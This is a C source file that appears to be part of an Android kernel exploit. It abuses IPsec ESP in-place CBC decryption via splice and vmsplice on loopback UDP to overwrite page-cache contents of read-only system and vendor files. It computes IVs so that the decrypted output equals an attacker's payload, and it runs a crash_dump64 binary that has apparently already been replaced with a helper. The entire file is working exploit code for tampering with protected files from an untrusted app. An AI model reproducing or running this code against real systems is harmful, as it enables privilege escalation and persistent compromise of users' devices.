#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include "aes256.h"
#include "hmac_sha256.h"
#include "exploit.h"

static char vendor_target[64];
static int g_encap_port, g_sender_port, g_icv_len;
static uint32_t g_spi, g_seq = 1;
static uint8_t g_aes_key[32], g_hmac_key[32];

void cbc_configure(int encap_port, int sender_port, uint32_t spi,
                   const uint8_t aes_key[32], const uint8_t hmac_key[32],
                   int icv_len, const char *target) {
    g_encap_port = encap_port;
    g_sender_port = sender_port;
    g_spi = spi;
    g_seq = 1;
    g_icv_len = icv_len;
    memcpy(g_aes_key, aes_key, sizeof(g_aes_key));
    memcpy(g_hmac_key, hmac_key, sizeof(g_hmac_key));
    strncpy(vendor_target, target, sizeof(vendor_target) - 1);
    vendor_target[sizeof(vendor_target) - 1] = '\0';
}

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 * crash_dump64 has been overwritten with splicehelper which supports argv[3]="r".
 */
static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }

    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);

    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) {
        REPORTLN("vfork failed: %s", strerror(errno));
        close(rdpipe[0]); close(rdpipe[1]);
        return -1;
    }
    if (pid == 0) {
        close(rdpipe[0]);
        if (rdpipe[1] != 0) {
            if (dup2(rdpipe[1], 0) < 0) _exit(1);
            close(rdpipe[1]);
        }
        execl(CRASH_DUMP_PATH, "crashdump64", offstr, vendor_target, "r", NULL);
        _exit(1);
    }
    close(rdpipe[1]);
    int status;
    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    int n = 0;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
    close(rdpipe[0]);
    if (n != 16) {
        if (WIFEXITED(status))
            REPORTLN("read_vendor at 0x%lx got %d bytes (exit %d)",
                     (long)offset, n, WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            REPORTLN("read_vendor at 0x%lx got %d bytes (signal %d)",
                     (long)offset, n, WTERMSIG(status));
        else
            REPORTLN("read_vendor at 0x%lx got %d bytes (status 0x%x)",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], const uint8_t old_content[16],
                            int use_helper, struct Reporter *reporter) {
    int ret = -1;

    int pfd[2];
    if (pipe(pfd) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
    fcntl(pfd[1], F_SETPIPE_SZ, 65536);

    /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
    uint32_t seq = g_seq++;
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(seq);
    memcpy(hdr + 8, iv, 16);

    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
    uint8_t hmac_msg[40];
    memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
    memcpy(hmac_msg + 8,  iv,          16);  /* IV */
    memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
    uint8_t hmac_full[32];
    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);

    /* vmsplice header + IV (24 bytes) */
    struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
        REPORTLN("vmsplice hdr failed: %s", strerror(errno)); goto out_pipe;
    }

    /* splice ciphertext from file (16 bytes, page-cache reference) */
    if (use_helper) {
        char offstr[24];
        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
        if (pid < 0) { REPORTLN("vfork failed: %s", strerror(errno)); goto out_pipe; }
        if (pid == 0) {
            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
            execl(CRASH_DUMP_PATH, "crashdump64", offstr, vendor_target, NULL);
            _exit(1);
        }
        int st;
        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            REPORTLN("splice helper failed status=0x%x", st);
            goto out_pipe;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
            REPORTLN("splice file failed: %s", strerror(errno)); goto out_pipe;
        }
    }

    /* vmsplice ICV (truncated HMAC) */
    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
        REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
    }

    /* splice pipe → UDP: 24 + 16 + icv_len bytes */
    {
        int total = 24 + 16 + g_icv_len;
        ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
        ret = (s == total) ? 0 : -1;
        if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
    }

out_pipe:
    close(pfd[0]); close(pfd[1]);
    return ret;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper, struct Reporter *reporter) {
    if (len % 16 != 0) {
        REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { REPORTLN("socket failed: %s", strerror(errno)); return -1; }
    {
        int opt = 1;
        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        struct sockaddr_in src = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_sender_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
            REPORTLN("bind port %d failed: %s", g_sender_port, strerror(errno));
        struct sockaddr_in dst = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_encap_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            REPORTLN("connect failed: %s", strerror(errno));
            close(sk_send); return -1;
        }
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            REPORTLN("open %s failed: %s", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content, reporter) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                REPORTLN("pread at 0x%lx failed: %s", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
            REPORTLN("write #%zu at 0x%lx failed", i, (long)off);
            rc = -1; break;
        }
        if (i % 32 == 0)
            REPORTLN("%zu ...", i * 16);
    }

    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx", len, path, foff);
    return rc;
}

